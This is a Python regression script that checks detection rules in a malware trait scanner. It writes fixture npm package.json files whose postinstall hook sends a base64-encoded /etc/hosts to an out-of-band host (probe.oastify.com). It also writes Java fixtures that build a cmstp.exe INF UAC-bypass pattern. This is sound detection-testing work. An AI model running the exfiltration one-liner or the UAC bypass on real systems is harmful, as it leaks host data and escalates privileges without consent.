"""Static regression controls; fixture programs are never executed."""
import argparse
import json
import os
from pathlib import Path
import subprocess

parser = argparse.ArgumentParser()
parser.add_argument('--scratch', required=True)
parser.add_argument('--native', type=Path)
args = parser.parse_args()
root = Path(__file__).resolve().parents[2]
work = Path(args.scratch) / 'current-controls'
work.mkdir(parents=True, exist_ok=True)
exfil = 'objectives/exfiltration/stealer/system-info/network::npm-postinstall-hosts-oob-post'
cmstp = 'objectives/privilege-escalation/elevation-control/uac-bypass/inf::jvm-cmstp-inf-dialog-bypass'
positive = "python3 -c \"import base64,httpx; body=base64.b64encode(open('/etc/hosts','rb').read()).decode(); httpx.post('http://probe.oastify.com/x', content=body)\""
cases = {
    'complete': ({'postinstall': positive}, True),
    'path-only': ({'postinstall': positive.replace("open('/etc/hosts','rb').read()", "b'/etc/hosts'")}, False),
    'no-transfer': ({'postinstall': positive.split('; httpx.post')[0] + '"'}, False),
    'ordinary-encoding': ({'preinstall': "python3 -c \"import base64; print(base64.b64encode(b'data'))\""}, False),
    'cross-hook-endpoint': ({'postinstall': positive.replace('probe.oastify.com', 'example.org'), 'preinstall': 'echo http://probe.oastify.com'}, False),
    'cross-hook-encoder': ({'postinstall': positive.replace('base64.b64encode(', 'str('), 'preinstall': 'echo base64'}, False),
}
expected = {}
for name, (scripts, match) in cases.items():
    target = work / name / 'package.json'
    target.parent.mkdir(exist_ok=True)
    target.write_text(json.dumps({'name': 'control', 'version': '1.0.0', 'scripts': scripts}))
    expected[target] = {exfil} if match else set()
# Realistic bytecode structures, including an invokedynamic INF template,
# are compiled locally. No class from the sample is loaded by the JVM.
sources = {
    'com/sun/jna/platform/win32/User32.java': 'package com.sun.jna.platform.win32; public class User32 { public static void SendMessage() {} }',
    'InfOnly.java': '''class InfOnly { static String inf(String s) {
      return "[DefaultInstall]\\r\\nRunPreSetupCommands=" + s + "\\r\\n";
    }}''',
    'InstallerControl.java': '''import java.nio.file.*;
    class InstallerControl { static void install(Path p, String s) throws Exception {
      Files.writeString(p, "[DefaultInstall]\\r\\nRunPreSetupCommands=" + s + "\\r\\n");
      Runtime.getRuntime().exec("cmstp.exe /au " + p);
    }}''',
    'DialogBypass.java': '''import java.nio.file.*;
    class DialogBypass { static void install(Path p, String s) throws Exception {
      Files.writeString(p, "[DefaultInstall]\\r\\nRunPreSetupCommands=" + s + "\\r\\n");
      Runtime.getRuntime().exec("cmstp.exe /au " + p); com.sun.jna.platform.win32.User32.SendMessage();
    }}''',
}
for name, source in sources.items():
    (work / name).parent.mkdir(parents=True, exist_ok=True)
    (work / name).write_text(source)
subprocess.run(['javac', '-g:none', '-d', str(work), *[str(work / n) for n in sources]], check=True)
for name in ['InfOnly', 'InstallerControl', 'DialogBypass']:
    expected[work / (name + '.class')] = {cmstp} if name == 'DialogBypass' else set()
# The deduplicated installer patterns differ only in equivalent regex spelling.
for tool in ['npm', 'pnpm', 'yarn', 'bun']:
    for verb in ['add', 'install', 'i']:
        target = work / (tool + '-' + verb + '.sh')
        target.write_text(tool + ' ' + verb + ' example\n')
        expected[target] = {'micro-behaviors/os/package-manager/install::package-manager-install-or-add-command'}
selected = {'objectives/supply-chain/recon-exfil/oast/secret::preinstall-post-oast-exfil', exfil, cmstp, 'micro-behaviors/os/package-manager/install::package-manager-install-or-add-command'}
if args.native:
    stage = 'objectives/execution/payload/process-inject::explorer-loader-hashed-socket-xor-stage'
    capability = 'micro-behaviors/process/inject/remote-thread::explorer-reference-remote-thread-api-set'
    selected.update({stage, capability})
    original = args.native.read_bytes()
    variants = {
        'renamed.exe': (original, {stage, capability}),
        'no-winsock-hash.exe': (original.replace(bytes.fromhex('ba34265233'), bytes.fromhex('ba35265233')), {capability}),
        'no-xor-handoff.exe': (original.replace(bytes.fromhex('43300c08'), bytes.fromhex('43900c08')), {capability}),
        'no-script-activation.exe': (original.replace('iex('.encode('utf-16le'), 'foo('.encode('utf-16le')), {capability}),
    }
    for name, (content, want) in variants.items():
        target = work / name
        target.write_bytes(content)
        expected[target] = want
run = subprocess.run(['cleave', '--traits-dir', str(root), '--format', 'json', *map(str, expected)], text=True, capture_output=True, check=True)
source = run.stdout.strip()
reports = {}
while source:
    entry, end = json.JSONDecoder().raw_decode(source)
    source = source[end:].lstrip()
    reports.update({item['path']: {t['id'] for t in item.get('traits', [])} for item in entry['files']})
for target, want in expected.items():
    got = reports[str(target)] & selected
    assert got == want, (target.name, got, want)
print(json.dumps({'cases': len(expected), 'failures': []}))
